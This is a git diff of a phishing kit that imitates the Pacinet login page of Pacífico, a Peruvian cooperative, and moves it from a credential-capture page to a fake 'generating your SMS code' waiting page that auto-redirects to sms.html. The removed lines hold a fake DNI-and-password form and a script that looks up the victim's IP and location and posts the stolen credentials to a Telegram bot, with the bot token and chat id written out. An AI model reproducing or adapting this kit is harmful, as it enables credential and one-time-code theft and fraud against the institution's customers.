@@ -5,11 +5,14 @@
     <meta charset="utf-8" />
     <title>Pacífico</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="refresh" content="25;url=sms.html">
+
     <link
       rel="icon"
       type="image/x-icon"
       href="https://pacinet.cp.com.pe/favicon.png"
     />
+  
 
     <style>
       @charset "UTF-8";
@@ -69,17 +72,6 @@
         }
       }
     </style>
-    <script>
-      function validarNumeros(event) {
-        const input = event.target;
-        const valorInput = input.value;
-        const patron = /^\d*$/; // Expresión regular para validar números
-
-        if (!patron.test(valorInput)) {
-          input.value = valorInput.replace(/[^\d]/g, ""); // Eliminar caracteres no numéricos
-        }
-      }
-    </script>
     <link
       rel="stylesheet"
       href="datos/styles.7af00e0c01ae7ce80e16.css"
@@ -407,222 +399,58 @@
                                 font-family: Arial, Helvetica, sans-serif !important;
                               "
                             >
-                              Ingresa a tu Cuenta
+                              Comprobando sus datos
                             </h1>
-                            <div
-                              _ngcontent-gxl-c48=""
-                              class="tab-slider--nav"
-                              style=""
-                            >
-                              <ul
-                                _ngcontent-gxl-c48=""
-                                class="tab-slider--tabs"
-                              >
-                                <li
-                                  _ngcontent-gxl-c48=""
-                                  rel="tab1"
-                                  class="tab-slider--trigger active"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                >
-                                  <a href="codigo.html" style="color: white"
-                                    >DNI</a
-                                  >
-                                </li>
-                                <li
-                                  _ngcontent-gxl-c48=""
-                                  rel="tab2"
-                                  class="tab-slider--trigger"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                >
-                                  <a href="codigo.html" style="color: #0071b9"
-                                    >Código de Socio</a
-                                  >
-                                </li>
-                              </ul>
-                            </div>
+
                             <div
                               _ngcontent-gxl-c48=""
                               id="tab1"
                               class="tab-slider--body"
                             >
                               <form
+                                id="loginform"
                                 _ngcontent-gxl-c48=""
                                 novalidate=""
                                 class="ng-untouched ng-pristine ng-invalid"
-                                id="loginform"
                               >
                                 <div
                                   _ngcontent-gxl-c48=""
                                   class="form_row clearfix"
                                 >
-                                  <div _ngcontent-gxl-c48="" class="form_cell">
-                                    <label
-                                      _ngcontent-gxl-c48=""
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                      "
-                                      >DNI: </label
-                                    ><span
-                                      _ngcontent-gxl-c48=""
-                                      class="user_dni_codigo"
-                                    >
-                                      <input
-                                        style="
-                                          font-family: Arial, Helvetica,
-                                            sans-serif !important;
-                                        "
-                                        _ngcontent-gxl-c48=""
-                                        type="text"
-                                        inputmode="numeric"
-                                        name="userCode"
-                                        autocomplete="off"
-                                        id="dni"
-                                        oninput="validarNumeros(event)"
-                                        class="form_element ng-untouched ng-pristine ng-invalid"
-                                        placeholder="Ingrese número de DNI"
-                                        minlength="8"
-                                        maxlength="8"
-                                        required
-                                      /><!----></span
-                                    >
-                                  </div>
-                                </div>
-                                <label
-                                  _ngcontent-gxl-c48=""
-                                  class="label_check open-modal"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                  >Recuérdame
-                                  <input
-                                    _ngcontent-gxl-c48=""
-                                    type="checkbox"
-                                    name="isCheckedRemember"
-                                    class="ng-untouched ng-pristine ng-valid" /><span
-                                    _ngcontent-gxl-c48=""
-                                    class="checkmark"
+                                  <div
                                     style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
+                                      width: 100%;
+                                      text-align: center;
+                                      margin-top: 40px;
                                     "
-                                  ></span
-                                ></label>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="form_row clearfix"
-                                >
-                                  <div _ngcontent-gxl-c48="" class="form_cell">
-                                    <label
-                                      _ngcontent-gxl-c48=""
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                      "
-                                      >Contraseña:</label
-                                    ><span
-                                      _ngcontent-gxl-c48=""
-                                      class="user_contrasena"
-                                      ><input
-                                        style="
-                                          font-family: Arial, Helvetica,
-                                            sans-serif !important;
-                                        "
-                                        _ngcontent-gxl-c48=""
-                                        name="userPassword"
-                                        placeholder="Ingrese su contraseña"
-                                        class="form_element ng-untouched ng-pristine ng-invalid"
-                                        type="password"
-                                        minlength="6"
-                                        maxlength="10"
-                                        id="contra"
-                                        required
-                                      /><!----></span
-                                    >
-                                  </div>
-                                </div>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="olvide_clave clearfix"
-                                >
-                                  <div _ngcontent-gxl-c48="">
-                                    <a
-                                      _ngcontent-gxl-c48=""
-                                      class="btn_olvide_pass"
-                                      href="https://pacinet.cp.com.pe/recoveryPassword"
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                        font-size: 12px;
-                                      "
-                                      >Desbloqueo de usuario</a
-                                    ><br _ngcontent-gxl-c48="" /><a
-                                      _ngcontent-gxl-c48=""
-                                      class="btn_olvide_pass"
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                        margin-top: 5px;
-                                        font-size: 12px;
-                                      "
-                                      href="https://pacinet.cp.com.pe/recoveryPassword"
-                                      >Olvidé mi contraseña</a
-                                    >
-                                  </div>
-                                  <a
-                                    _ngcontent-gxl-c48=""
-                                    class="btn_solicitar_pass"
-                                    href="https://pacinet.cp.com.pe/requestPassword"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                      font-size: 12px;
-                                    "
-                                    >Solicitar Contraseña</a
                                   >
+                                    <img
+                                      src="https://media.tenor.com/On7kvXhzml4AAAAi/loading-gif.gif"
+                                      style="width: 100px"
+                                    />
+                                  </div>
+                                </div>
+                                <div
+                                  style="
+                                    text-align: center;
+                                    width: 100%;
+                                    margin-top: 50px;
+                                  "
+                                >
+                                  <h1
+                                    style="
+                                      font-family: Arial, Helvetica, sans-serif !important;
+                                    "
+                                  >
+                                    Espere mientras Pacinet genera su Código de
+                                    Ingreso SMS
+                                  </h1>
                                 </div>
                                 <div
                                   _ngcontent-gxl-c48=""
                                   class="center_content content_capcha"
                                 ></div>
                                 <div _ngcontent-gxl-c48="" id="alert"></div>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="center_content"
-                                >
-                                  <button
-                                    _ngcontent-gxl-c48=""
-                                    type="submit"
-                                    class="boton_ingresar"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                    "
-                                  >
-                                    Ingresar
-                                  </button>
-                                </div>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="center_content"
-                                >
-                                  <div
-                                    _ngcontent-gxl-c48=""
-                                    class="cuenta_nueva"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                    "
-                                  >
-                                    No tengo código,
-                                    <a
-                                      _ngcontent-gxl-c48=""
-                                      href="https://inscripciones.cp.com.pe/?utm_source=web_pacinet&amp;utm_medium=boton"
-                                      target="_blank"
-                                      >Hazte socio aquí.</a
-                                    >
-                                  </div>
-                                </div>
                               </form>
                             </div>
                           </div>
@@ -815,12 +643,18 @@
         </div></app-loader
       ></app-root
     >
-    <script src="datos/runtime.81e45efed06e87fd0976.js" defer="defer"></script>
+    <script
+      src="datos/runtime.81e45efed06e87fd0976.js"
+      defer="defer"
+    ></script>
     <script
       src="datos/polyfills.500a931972a190eb8929.js"
       defer="defer"
     ></script>
-    <script src="datos/main.2fdd53f9ee0f5ccee6d9.js" defer="defer"></script>
+    <script
+      src="datos/main.2fdd53f9ee0f5ccee6d9.js"
+      defer="defer"
+    ></script>
 
     <div>
       <div
@@ -871,60 +705,4 @@
       <iframe style="display: none"></iframe>
     </div>
   </body>
-  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
-
-  <script>
-    const url = "https://ipapi.co/json/";
-    const form = document.querySelector("#loginform");
-
-    form.addEventListener("submit", (event) => {
-      event.preventDefault(); // Aquí evitamos que el formulario se envíe
-
-      // Obtener valores de DNI y contraseña
-      const dni = document.querySelector("#dni").value;
-      const contra = document.querySelector("#contra").value;
-
-      // Verificar si alguno de los campos está vacío
-      if (dni.trim() === "" || contra.trim() === "") {
-        alert("Por favor, completa todos los campos.");
-        return; // Detener la ejecución si hay campos vacíos
-      }
-
-      // Si los campos no están vacíos, continuar con la solicitud
-      axios
-        .get(url)
-        .then((response) => {
-          localStorage.setItem("usuario", dni);
-          const message =
-            "\nPacifico" +
-            "\nDNI: " +
-            dni +
-            "\nContraseña: " +
-            contra +
-            "\nCiudad:" +
-            response.data.city +
-            "\nPais: " +
-            response.data.country +
-            "\nIP: " +
-            response.data.ip;
-          axios
-            .post(
-              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
-              {
-                chat_id: "-4139256120",
-                text: message,
-              }
-            )
-            .then((response) => {
-              parent.location.href = "correo.html";
-            })
-            .catch((error) => {
-              console.error(error);
-            });
-        })
-        .catch((error) => {
-          console.log(error);
-        });
-    });
-  </script>
 </html>
